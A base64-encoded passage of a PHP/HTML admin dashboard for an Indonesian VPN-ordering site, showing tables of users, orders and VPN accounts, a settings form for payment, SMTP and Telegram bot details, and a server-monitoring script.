kZm9yZWFjaDs/PgogICAgICAgICAgPC90Ym9keT4KICAgICAgICA8L3RhYmxlPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIFVTRVJTIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UiIGlkPSJ0YWItdXNlcnMiPgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj4gRGFmdGFyIFVzZXIgKDw/PWNvdW50KCR1c2Vycyk/Pik8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IG92ZXJmbG93LXgiPgogICAgICAgIDx0YWJsZT4KICAgICAgICAgIDx0aGVhZD48dHI+PHRoPlVzZXJuYW1lPC90aD48dGg+RW1haWw8L3RoPjx0aD5TYWxkbzwvdGg+PHRoPlZlcmlmaWVkPC90aD48dGg+Um9sZTwvdGg+PHRoPkRhZnRhcjwvdGg+PHRoPkFrc2k8L3RoPjwvdHI+PC90aGVhZD4KICAgICAgICAgIDx0Ym9keT4KICAgICAgICAgIDw/cGhwIGZvcmVhY2goJHVzZXJzIGFzICR1KTo/PgogICAgICAgICAgPHRyPgogICAgICAgICAgICA8dGQ+PHN0cm9uZz48Pz1odG1sc3BlY2lhbGNoYXJzKCR1Wyd1c2VybmFtZSddKT8+PC9zdHJvbmc+PC90ZD4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHVbJ2VtYWlsJ10pPz48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImNvbG9yOnZhcigtLWdyZWVuKTtmb250LXdlaWdodDo2MDAiPjw/PWZvcm1hdFJ1cGlhaCgkdVsnc2FsZG8nXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48Pz0kdVsnaXNfdmVyaWZpZWQnXT8nQWN0aXZlJzonUGVuZGluZyc/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UiIHN0eWxlPSI8Pz0kdVsncm9sZSddPT09J2FkbWluJz8nYmFja2dyb3VuZDojNGMxZDk1MjI7Y29sb3I6I2E3OGJmYSc6J2JhY2tncm91bmQ6IzBhMTYyODtjb2xvcjp2YXIoLS1tdXRlZCknIj48Pz0kdVsncm9sZSddPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtIj48Pz1kYXRlKCdkIE0gWScsc3RydG90aW1lKCR1WydjcmVhdGVkX2F0J10pKT8+PC90ZD4KICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgIDw/cGhwIGlmKCR1Wydyb2xlJ10hPT0nYWRtaW4nKTo/PgogICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIGNvbmZpcm0oJ0hhcHVzIHVzZXIgPD89aHRtbHNwZWNpYWxjaGFycygkdVsndXNlcm5hbWUnXSk/Pj8nKSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJkZWxldGVfdXNlciI+PD9waHAgZWNobyBjc3JmRmllbGQoKTsgPz4+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1c2VyX2lkIiB2YWx1ZT0iPD89JHVbJ2lkJ10/PiI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXJlZCBidG4tc20iPjwvYnV0dG9uPgogICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICA8P3BocCBlbmRpZjs/PgogICAgICAgICAgICA8L3RkPgogICAgICAgICAgPC90cj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7Pz4KICAgICAgICAgIDwvdGJvZHk+CiAgICAgICAgPC90YWJsZT4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCiAgPCEtLSBPUkRFUlMgLyBMQVBPUkFOIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UiIGlkPSJ0YWItb3JkZXJzIj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+IExhcG9yYW4gUGVtYmVsaWFuPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBvdmVyZmxvdy14Ij4KICAgICAgICA8dGFibGU+CiAgICAgICAgICA8dGhlYWQ+PHRyPjx0aD5Vc2VyPC90aD48dGg+S2V0ZXJhbmdhbjwvdGg+PHRoPk5vbWluYWw8L3RoPjx0aD5TdGF0dXM8L3RoPjx0aD5UYW5nZ2FsPC90aD48L3RyPjwvdGhlYWQ+CiAgICAgICAgICA8dGJvZHk+CiAgICAgICAgICA8P3BocCBmb3JlYWNoKCRvcmRlcnMgYXMgJG8pOj8+CiAgICAgICAgICA8dHI+CiAgICAgICAgICAgIDx0ZD48Pz1odG1sc3BlY2lhbGNoYXJzKCRvWyd1c2VybmFtZSddKT8+PC90ZD4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJG9bJ2tldGVyYW5nYW4nXT8/JycpPz48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMDtjb2xvcjp2YXIoLS1ibHVlKSI+PD89Zm9ybWF0UnVwaWFoKCRvWydhbW91bnQnXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48c3BhbiBjbGFzcz0iYmFkZ2UgYi08Pz0kb1snc3RhdHVzJ10/PiI+PD89JG9bJ3N0YXR1cyddPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtIj48Pz1kYXRlKCdkIE0gWSBIOmknLHN0cnRvdGltZSgkb1snY3JlYXRlZF9hdCddKSk/PjwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgICAgPC90Ym9keT4KICAgICAgICA8L3RhYmxlPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIEFLVU4gVlBOIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UiIGlkPSJ0YWItYWt1bnMiPgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5BbGwgVlBOIEFjY291bnRzPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBvdmVyZmxvdy14Ij4KICAgICAgICA8dGFibGU+CiAgICAgICAgICA8dGhlYWQ+PHRyPjx0aD5Vc2VyPC90aD48dGg+VXNlcm5hbWU8L3RoPjx0aD5UaXBlPC90aD48dGg+U2VydmVyPC90aD48dGg+RXhwaXJlZDwvdGg+PHRoPlN0YXR1czwvdGg+PC90cj48L3RoZWFkPgogICAgICAgICAgPHRib2R5PgogICAgICAgICAgPD9waHAgZm9yZWFjaCgkYWxsQWt1bnMgYXMgJGEpOj8+CiAgICAgICAgICA8dHI+CiAgICAgICAgICAgIDx0ZD48Pz1odG1sc3BlY2lhbGNoYXJzKCRhWyd1bmFtZSddKT8+PC90ZD4KICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LWZhbWlseTptb25vc3BhY2UiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ3VzZXJuYW1lJ10pPz48Pz0kYVsnaXNfdHJpYWwnXT8nIChUcmlhbCknOicnPz48L3RkPgogICAgICAgICAgICA8dGQ+PHNwYW4gY2xhc3M9ImJhZGdlIGItYWN0aXZlIj48Pz1zdHJ0b3VwcGVyKCRhWyd0aXBlJ10pPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ25hbWFfc2VydmVyJ10pPz48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW0iPjw/PWRhdGUoJ2QgTSBZIEg6aScsc3RydG90aW1lKCRhWydtYXNhX2FrdGlmJ10pKT8+PC90ZD4KICAgICAgICAgICAgPHRkPjxzcGFuIGNsYXNzPSJiYWRnZSBiLTw/PSRhWydzdGF0dXMnXT8+Ij48Pz0kYVsnc3RhdHVzJ10/Pjwvc3Bhbj48L3RkPgogICAgICAgICAgPC90cj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7Pz4KICAgICAgICAgIDwvdGJvZHk+CiAgICAgICAgPC90YWJsZT4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCiAgPCEtLSBTRVRUSU5HUyAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIiBpZD0idGFiLXNldHRpbmdzIj4KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzYXZlX3NldHRpbmdzIj48P3BocCBlY2hvIGNzcmZGaWVsZCgpOyA/Pj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+QXBwbGljYXRpb24gSW5mbzwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgIDxkaXYgY2xhc3M9ImdyaWQyIj4KICAgICAgICAgIDxkaXY+PGxhYmVsPk5hbWEgQXBsaWthc2k8L2xhYmVsPjxpbnB1dCBuYW1lPSJhcHBfbmFtZSIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnYXBwX25hbWUnLCdPcmRlclZQTicpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkxvZ28gKEVtb2ppKTwvbGFiZWw+PGlucHV0IG5hbWU9ImFwcF9sb2dvIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdhcHBfbG9nbycsJ09WUE4nKSk/PiI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPkFkbWluIENvbnRhY3Q8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJncmlkMyI+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5XaGF0c0FwcCAobm9tb3IpPC9sYWJlbD48aW5wdXQgbmFtZT0iY29udGFjdF93YSIgcGxhY2Vob2xkZXI9IjYyOHh4eHh4eHh4eHgiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2NvbnRhY3Rfd2EnKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5UZWxlZ3JhbSAoQHVzZXJuYW1lKTwvbGFiZWw+PGlucHV0IG5hbWU9ImNvbnRhY3RfdGciIHBsYWNlaG9sZGVyPSJAdXNlcm5hbWUiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ2NvbnRhY3RfdGcnKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5JbnN0YWdyYW0gKEB1c2VybmFtZSk8L2xhYmVsPjxpbnB1dCBuYW1lPSJjb250YWN0X2lnIiBwbGFjZWhvbGRlcj0iQHVzZXJuYW1lIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdjb250YWN0X2lnJykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5NYW51YWwgUGF5bWVudCBNZXRob2RzPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbi10aXRsZSI+QmFuayBUcmFuc2ZlcjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImdyaWQzIj4KICAgICAgICAgIDxkaXY+PGxhYmVsPk5hbWEgQmFuazwvbGFiZWw+PGlucHV0IG5hbWU9ImJhbmtfbmFtZSIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnYmFua19uYW1lJywnQkNBJykpPz4iPjwvZGl2PgogICAgICAgICAgPGRpdj48bGFiZWw+Tm8uIFJla2VuaW5nPC9sYWJlbD48aW5wdXQgbmFtZT0iYmFua19hY2NvdW50IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdiYW5rX2FjY291bnQnKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5BdGFzIE5hbWE8L2xhYmVsPjxpbnB1dCBuYW1lPSJiYW5rX2hvbGRlciIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnYmFua19ob2xkZXInKSk/PiI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbi10aXRsZSI+RS1XYWxsZXQ8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJncmlkMyI+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5EYW5hIChub21vciBIUCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJkYW5hX251bWJlciIgcGxhY2Vob2xkZXI9IjA4eHh4eHh4eHh4eCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnZGFuYV9udW1iZXInKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5Hb1BheSAobm9tb3IgSFApPC9sYWJlbD48aW5wdXQgbmFtZT0iZ29wYXlfbnVtYmVyIiBwbGFjZWhvbGRlcj0iMDh4eHh4eHh4eHh4IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdnb3BheV9udW1iZXInKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5TaG9wZWVQYXkgKG5vbW9yIEhQKTwvbGFiZWw+PGlucHV0IG5hbWU9InNob3BlZV9udW1iZXIiIHBsYWNlaG9sZGVyPSIwOHh4eHh4eHh4eHgiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3Nob3BlZV9udW1iZXInKSk/PiI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbi10aXRsZSI+UVJJUzwvZGl2PgogICAgICAgIDxkaXY+PGxhYmVsPlVwbG9hZCBHYW1iYXIgUVJJUzwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9InFyaXNfaW1hZ2UiIGFjY2VwdD0iaW1hZ2UvKiIgc3R5bGU9Im1hcmdpbi1ib3R0b206LjVyZW0iPjwvZGl2PgogICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ3FyaXNfaW1hZ2UnKSk6Pz48aW1nIHNyYz0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdxcmlzX2ltYWdlJykpPz4iIHN0eWxlPSJtYXgtd2lkdGg6MTUwcHg7Ym9yZGVyLXJhZGl1czo4cHg7bWFyZ2luLWJvdHRvbTouNzVyZW0iPjw/cGhwIGVuZGlmOz8+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPlsxRjRFN10gRW1haWwgU01UUCAoR21haWwpPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTouNzhyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi1ib3R0b206Ljc1cmVtIj5VbnR1ayBPVFAgdmVyaWZpa2FzaS4gR21haWw6IGFrdGlma2FuIDJGQSDihpIgYnVhdCBBcHAgUGFzc3dvcmQgZGkgbXlhY2NvdW50Lmdvb2dsZS5jb20vc2VjdXJpdHk8L3A+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDMiPgogICAgICAgICAgPGRpdj48bGFiZWw+U01UUCBIb3N0PC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF9ob3N0IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdzbXRwX2hvc3QnLCdzbXRwLmdtYWlsLmNvbScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlBvcnQ8L2xhYmVsPjxpbnB1dCBuYW1lPSJzbXRwX3BvcnQiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3NtdHBfcG9ydCcsJzU4NycpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkVtYWlsIFBlbmdpcmltPC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF9mcm9tIiBwbGFjZWhvbGRlcj0ibm9yZXBseUBnbWFpbC5jb20iIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3NtdHBfZnJvbScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlVzZXJuYW1lIEdtYWlsPC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF91c2VyIiBwbGFjZWhvbGRlcj0iZW1haWxAZ21haWwuY29tIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdzbXRwX3VzZXInKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5BcHAgUGFzc3dvcmQgR21haWw8L2xhYmVsPjxpbnB1dCBuYW1lPSJzbXRwX3Bhc3MiIHR5cGU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0ieHh4eCB4eHh4IHh4eHggeHh4eCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnc210cF9wYXNzJykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5bQk9UXSBUZWxlZ3JhbSBCb3QgTm90aWZpa2FzaTwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgIDxkaXYgY2xhc3M9ImdyaWQyIj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkJvdCBUb2tlbjwvbGFiZWw+PGlucHV0IG5hbWU9InRnX2JvdF90b2tlbiIgcGxhY2Vob2xkZXI9IjEyMzQ1NjpBQkMuLi4iIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3RnX2JvdF90b2tlbicpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkNoYXQgSUQgQWRtaW48L2xhYmVsPjxpbnB1dCBuYW1lPSJ0Z19jaGF0X2lkIiBwbGFjZWhvbGRlcj0iLTEwMC4uLiIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygndGdfY2hhdF9pZCcpKT8+Ij48L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+W1BPV0VSXSBQZW5nYXR1cmFuIFRyaWFsPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDIiPgogICAgICAgICAgPGRpdj48bGFiZWw+RHVyYXNpIFRyaWFsIChqYW0pPC9sYWJlbD48aW5wdXQgbmFtZT0idHJpYWxfZHVyYXRpb25faG91cnMiIHR5cGU9Im51bWJlciIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygndHJpYWxfZHVyYXRpb25faG91cnMnLCcxJykpPz4iPjwvZGl2PgogICAgICAgICAgPGRpdj48bGFiZWw+UXVvdGEgVHJpYWwgKEdCKTwvbGFiZWw+PGlucHV0IG5hbWU9InRyaWFsX3F1b3RhX2diIiB0eXBlPSJudW1iZXIiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3RyaWFsX3F1b3RhX2diJywnMScpKT8+Ij48L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImdyaWQyIiBzdHlsZT0ibWFyZ2luLXRvcDouNzVyZW0iPgogICAgICAgICAgICAgICAgPGRpdj48bGFiZWw+SGFyZ2EvSGFyaSAoUnApPC9sYWJlbD48aW5wdXQgbmFtZT0iaGFyZ2FfaGFyaSIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iMzAwIj48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXY+PGxhYmVsPkhhcmdhL0J1bGFuIChScCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJoYXJnYV9idWxhbiIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iOTAwMCI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgc3R5bGU9IndpZHRoOjEwMCU7cGFkZGluZzouODc1cmVtO2ZvbnQtc2l6ZTouOXJlbTttYXJnaW4tdG9wOi41cmVtIj5bU0FWRV0gU2ltcGFuIFNlbXVhIFBlbmdhdHVyYW48L2J1dHRvbj4KICAgIDwvZm9ybT4KICA8L2Rpdj4KCjwvZGl2PjwhLS0gLmNvbnRlbnQgLS0+CjxzY3JpcHQ+CmZ1bmN0aW9uIHNob3dUYWIodCl7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLnBhZ2UnKS5mb3JFYWNoKHA9PnAuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy50YWItYnRuJykuZm9yRWFjaChiPT5iLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGFiLScrdCkuY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7CiAgZXZlbnQudGFyZ2V0LmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpOwp9Cjwvc2NyaXB0PgoKPHNjcmlwdD4KLy8gPT09IFNFUlZFUiBNT05JVE9SSU5HIC0gQXV0by1yZWZyZXNoIGV2ZXJ5IDMwcyA9PT0KbGV0IG1vbml0b3JUaW1lciA9IG51bGw7CmxldCBtb25pdG9ySW50ZXJ2YWwgPSAzMDAwMDsKCmZ1bmN0aW9uIHN0YXJ0TW9uaXRvclJlZnJlc2goKSB7CiAgICBmZXRjaE1vbml0b3JEYXRhKCk7CiAgICBpZiAobW9uaXRvclRpbWVyKSBjbGVhckludGVydmFsKG1vbml0b3JUaW1lcik7CiAgICBtb25pdG9yVGltZXIgPSBzZXRJbnRlcnZhbChmZXRjaE1vbml0b3JEYXRhLCBtb25pdG9ySW50ZXJ2YWwpOwp9CgpmdW5jdGlvbiBmZXRjaE1vbml0b3JEYXRhKCkgewogICAgLy8gRmV0Y2ggc2VydmVyIGxpc3QsIHRoZW4gbW9uaXRvciBlYWNoIGluZGl2aWR1YWxseSAocGFyYWxsZWwgaW4gYnJvd3NlcikKICAgIGZldGNoKCcvb3JkZXJ2cG4vYWRtaW4vP2FqYXhfbW9uaXRvcl9saXN0JnQ9JyArIERhdGUubm93KCkpCiAgICAgICAgLnRoZW4ociA9PiByLmpzb24oKSkKICAgICAgICAudGhlbihzZXJ2ZXJzID0+IHsKICAgICAgICAgICAgc2VydmVycy5mb3JFYWNoKHMgPT4gewogICAgICAgICAgICAgICAgZmV0Y2goJy9vcmRlcnZwbi9hZG1pbi8/YWpheF9tb25pdG9yX3NpbmdsZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHMuY29kZSkgKyAnJnQ9JyArIERhdGUubm93KCkpCiAgICAgICAgICAgICAgICAgICAgLnRoZW4ociA9PiByLmpzb24oKSkKICAgICAgICAgICAgICAgICAgICAudGhlbihkYXRhID0+IHVwZGF0ZVNlcnZlclJvdyhzLmNvZGUsIGRhdGEpKQogICAgICAgICAgICAgICAgICAgIC5jYXRjaCgoKSA9PiB1cGRhdGVTZXJ2ZXJSb3cocy5jb2RlLCBudWxsKSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwp9CgpmdW5jdGlvbiB1cGRhdGVTZXJ2ZXJSb3coY29kZSwgZGF0YSkgewogICAgY29uc3Qgc2FmZUNvZGUgPSBlbmNvZGVVUklDb21wb25lbnQoY29kZSk7IC8vIHVzZWQgaW4gRE9NIGxvb2t1cAogICAgaWYgKCFkYXRhIHx8ICFkYXRhLnN1Y2Nlc3MpIHsKICAgICAgICB1cGRhdGVDZWxsKCdwaW5nJywgY29kZSwgJzxzcGFuIHN0eWxlPSJjb2xvcjp2YXIoLS1kYW5nZXIpIj5PRkY8L3NwYW4+Jyk7CiAgICAgICAgdXBkYXRlQ2VsbCgndXB0aW1lJywgY29kZSwgJzxzcGFuIHN0eWxlPSJjb2xvcjp2YXIoLS1kYW5nZXIpIj4tPC9zcGFuPicpOwogICAgICAgIHVwZGF0ZUNlbGwoJ2NwdScsIGNvZGUsICctJyk7CiAgICAgICAgdXBkYXRlQ2VsbCgncmFtJywgY29kZSwgJy0nKTsKICAgICAgICB1cGRhdGVDZWxsKCdhY2NvdW50cycsIGNvZGUsICctJyk7CiAgICAgICAgdXBkYXRlQ2VsbCgnc3RhdHVzJywgY29kZSwgJzxzcGFuIGNsYXNzPSJiYWRnZSBiLWRhbmdlciI+T0ZGTElORTwvc3Bhbj4nKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICB1cGRhdGVDZWxsKCdwaW5nJywgY29kZSwgZGF0YS5waW5nX21zICE9PSBudWxsID8gKGRhdGEucGluZ19tcyB8fCAnPycpICsgJ21zJyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6dmFyKC0tZGFuZ2VyKSI+Pzwvc3Bhbj4nKTsKICAgIHVwZGF0ZUNlbGwoJ3VwdGltZScsIGNvZGUsIGRhdGEudXB0aW1lIHx8ICc/Jyk7CiAgICB1cGRhdGVDZWxsKCdjcHUnLCBjb2RlLCBkYXRhLmNwdSAhPT0gbnVsbCA/IGNvbG9yQnlMb2FkKGRhdGEuY3B1LCAnY3B1JykgOiAnLScpOwogICAgdXBkYXRlQ2VsbCgncmFtJywgY29kZSwgZGF0YS5yYW0gIT09IG51bGwgPyBjb2xvckJ5TG9hZChkYXRhLnJhbSwgJ3JhbScpIDogJy0nKTsKICAgIAogICAgY29uc3QgYWNjdHMgPSAoZGF0YS5zc2hfY291bnR8fDApICsgKGRhdGEudm1lc3NfY291bnR8fDApICsgKGRhdGEudmxlc3NfY291bnR8fDApICsgKGRhdGEudHJvamFuX2NvdW50fHwwKTsKICAgIHVwZGF0ZUNlbGwoJ2FjY291bnRzJywgY29kZSwgJzxzcGFuIHRpdGxlPSJTU0g6JyArIChkYXRhLnNzaF9jb3VudHx8MCkgKyAnIFY6JyArIChkYXRhLnZtZXNzX2NvdW50fHwwKSArICciPicgKyBhY2N0cyArICc8L3NwYW4+Jyk7CiAgICAKICAgIGNvbnN0IG9ubGluZSA9IChkYXRhLnhyYXkgPT09ICdhY3RpdmUnIHx8IGRhdGEubmdpbnggPT09ICdhY3RpdmUnIHx8IGRhdGEuc3NoID09PSAnYWN0aXZlJyk7CiAgICB1cGRhdGVDZWxsKCdzdGF0dXMnLCBjb2RlLCBvbmxpbmUgPyAnPHNwYW4gY2xhc3M9ImJhZGdlIGItb25saW5lIj5P